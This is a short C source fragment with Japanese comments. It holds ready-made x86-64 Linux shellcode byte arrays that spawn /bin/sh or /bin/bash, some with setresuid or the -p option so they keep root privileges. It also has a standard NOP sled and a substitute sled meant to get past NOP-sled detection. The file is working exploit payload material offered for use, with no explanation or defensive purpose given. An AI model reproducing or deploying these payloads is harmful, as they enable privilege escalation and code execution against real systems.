//shを呼び出すシェルコード(26byte)
//char shellcode[] = "\x6a\x3b\x58\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

//shにpオプションを付加して呼び出すシェルコード(34byte)
//char shellcode[] = "\x6a\x3b\x58\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x52\x66\x68\x2d\x70\x54\x5e\x52\x54\x5a\x56\x57\x54\x5e\x0f\x05";

//setresuidを呼び出した後、shを呼び出すシェルコード(35byte)
char shellcode[] = "\x6a\x75\x58\x99\x52\x52\x5f\x5e\x0f\x05\x6a\x3b\x58\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

//setresuidを呼び出した後、shにpオプションを付加して呼び出すシェルコード(43byte)
//char shellcode[] = "\x6a\x75\x58\x99\x52\x52\x5f\x5e\x0f\x05\x6a\x3b\x58\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x52\x66\x68\x2d\x70\x54\x5e\x52\x54\x5a\x56\x57\x54\x5e\x0f\x05";

//bashを呼び出すシェルコード(27byte)
//char shellcode[] = "\x6a\x3b\x58\x99\x6a\x68\x48\xbf\x2f\x62\x69\x6e\x2f\x62\x61\x73\x57\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

//bashにpオプションを付加して呼び出すシェルコード(35byte)
//char shellcode[] = "\x6a\x3b\x58\x99\x6a\x68\x48\xbf\x2f\x62\x69\x6e\x2f\x62\x61\x73\x57\x54\x5f\x52\x66\x68\x2d\x70\x54\x5e\x52\x54\x5a\x56\x57\x54\x5e\x0f\x05";

//setresuidを呼び出した後、bashを呼び出すシェルコード(36byte)
//char shellcode[] = "\x6a\x75\x58\x99\x52\x52\x5f\x5e\x0f\x05\x6a\x3b\x58\x6a\x68\x48\xbf\x2f\x62\x69\x6e\x2f\x62\x61\x73\x57\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";

//setresuidを呼び出した後、bashにpオプションを付加して呼び出すシェルコード(44byte)
//char shellcode[] = "\x6a\x75\x58\x99\x52\x52\x5f\x5e\x0f\x05\x6a\x3b\x58\x6a\x68\x48\xbf\x2f\x62\x69\x6e\x2f\x62\x61\x73\x57\x54\x5f\x52\x66\x68\x2d\x70\x54\x5e\x52\x54\x5a\x56\x57\x54\x5e\x0f\x05";

//典型的なnopスレッド(40byte)
char nop_sled[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

//nopスレッドを検出するシステムに対しては、シェルコードの実行に差し支えのないような命令を並べたものをnopスレッドとして使用する(39byte)
//char nop_sled[] = "\x48\x31\xd9\x48\x89\xfe\x48\xff\xcb\x48\x89\xd9\x48\xff\xc3\x5e\x5e\x48\xff\xc3\x48\xff\xc7\x48\x31\xfe\x48\xff\xc0\x59\x48\x89\xca\x48\x31\xc3\x48\x89\xf0";